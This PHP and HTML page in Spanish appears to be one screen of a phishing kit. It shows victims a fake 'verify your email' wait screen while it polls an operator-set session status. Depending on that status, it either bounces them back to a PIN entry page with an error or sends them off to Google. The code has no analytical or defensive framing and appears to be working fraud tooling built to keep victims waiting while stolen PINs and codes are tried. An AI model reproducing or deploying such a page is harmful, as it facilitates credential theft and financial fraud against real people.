<?php
session_start();
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';

// Si se solicita verificar el estado vía AJAX/Fetch
if (isset($_GET['chequear']) && !empty($id_sesion)) {
    header('Content-Type: application/json');
    $ruta_json = "sesiones/{$id_sesion}.json";
    if (file_exists($ruta_json)) {
        $datos = json_decode(file_get_contents($ruta_json), true);
        echo json_encode(['estado' => $datos['estado']]);
    } else {
        echo json_encode(['estado' => 'desconectado']);
    }
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifique su Correo</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 420px; box-sizing: border-box; text-align: center; }
        h2 { color: #333; margin-top: 15px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .icon-box { margin: 0 auto; width: 60px; height: 60px; border: 2px solid #333; display: flex; align-items: center; justify-content: center; }
        .icon-box svg { width: 32px; height: 32px; fill: #333; }
    </style>
    <script>
        // Consultar el estado en segundo plano cada 1.5 segundos
        setInterval(function() {
            fetch('esperar_correo.php?chequear=1')
                .then(response => response.json())
                .then(data => {
                    if (data.estado === 'pin_rebotado') {
                        // Redirige directo a la pantalla de PIN con la alerta de error activada
                        window.location.href = 'pin.php?error=pin_malo';
                    } else if (data.estado === 'ir_a_google') {
                        // Saca al usuario enviándolo a Google de inmediato
                        window.location.href = 'https://www.google.com';
                    }
                });
        }, 1500);
    </script>
</head>
<body>
    <div class="card">
        <div class="icon-box">
            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
        </div>
        <h2>Verifique su Correo</h2>
        <p>Le hemos enviado un mensaje por vía correo electrónico para que autentique esta operación.<br>Por favor, revise su bandeja de entrada o la carpeta de spam y siga las instrucciones.</p>
    </div>
</body>
</html>
